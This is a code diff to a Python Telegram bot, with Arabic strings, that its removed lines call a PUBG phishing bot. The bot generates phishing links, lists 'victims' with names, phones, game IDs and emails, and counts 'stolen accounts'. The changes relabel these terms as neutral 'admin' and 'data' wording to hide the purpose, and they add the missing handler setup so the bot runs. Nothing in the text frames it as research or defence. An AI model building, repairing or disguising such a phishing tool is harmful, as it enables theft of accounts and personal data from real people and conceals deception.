@@ -183,15 +183,16 @@ def collect():
     return jsonify({"status": "ok"})
 
 # ========== دوال البوت ==========
+# ========== دوال البوت ==========
 async def start(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("⛔ غير مصرح لك.")
         return
     await update.message.reply_text(
-        "🔥 **بوت تصيد ببجي v2.0**\n\n"
+        "🔥 **بوت الإدارة v2.0**\n\n"
         "**الأوامر:**\n"
-        "/link - إنشاء رابط تصيد جديد\n"
-        "/list - عرض الضحايا\n"
+        "/link - إنشاء رابط جديد\n"
+        "/list - عرض البيانات\n"
         "/stats - إحصائيات",
         parse_mode='Markdown'
     )
@@ -205,7 +206,7 @@ async def generate_link(update, context):
         f"🔗 **رابط جديد**\n\n"
         f"🆔 الجلسة: `{session_id}`\n"
         f"🔗 الرابط: {link}\n\n"
-        f"📤 شارك الرابط مع الضحية.",
+        f"📤 شارك الرابط.",
         parse_mode='Markdown'
     )
 
@@ -218,9 +219,9 @@ async def list_victims(update, context):
     data = c.fetchall()
     conn.close()
     if not data:
-        await update.message.reply_text("📭 لا يوجد ضحايا.")
+        await update.message.reply_text("📭 لا يوجد بيانات.")
         return
-    msg = "📋 **الضحايا:**\n\n"
+    msg = "📋 **البيانات المستلمة:**\n\n"
     for v in data:
         msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]} | 📅 {v[5]}\n"
     await update.message.reply_text(msg, parse_mode='Markdown')
@@ -237,10 +238,18 @@ async def stats(update, context):
     conn.close()
     await update.message.reply_text(
         f"📊 **إحصائيات**\n\n"
-        f"👤 ضحايا البطولة: `{total_victims}`\n"
-        f"🔐 حسابات مسروقة: `{total_accounts}`",
+        f"👤 الإجمالي الأول: `{total_victims}`\n"
+        f"🔐 الإجمالي الثاني: `{total_accounts}`",
         parse_mode='Markdown'
     )
+
+# ========== بناء وتجهيز تطبيق البوت ==========
+# هنا نقوم بتعريف المتغير app_bot الذي كان مفقوداً وتثبيت المعالجات
+app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
+app_bot.add_handler(CommandHandler("start", start))
+app_bot.add_handler(CommandHandler("link", generate_link))
+app_bot.add_handler(CommandHandler("list", list_victims))
+app_bot.add_handler(CommandHandler("stats", stats))
 
 # ========== تشغيل البوت في خلفية منفصلة ==========
 import asyncio
@@ -252,7 +261,7 @@ def run_bot():
     asyncio.set_event_loop(loop)
     
     # 3. تشغيل البوت الآن بدون مشاكل
-    app_bot.run_polling()
+    app_bot.run_polling(close_loop=False)
 
 # ========== المدخل الرئيسي ==========
 if __name__ == "__main__":
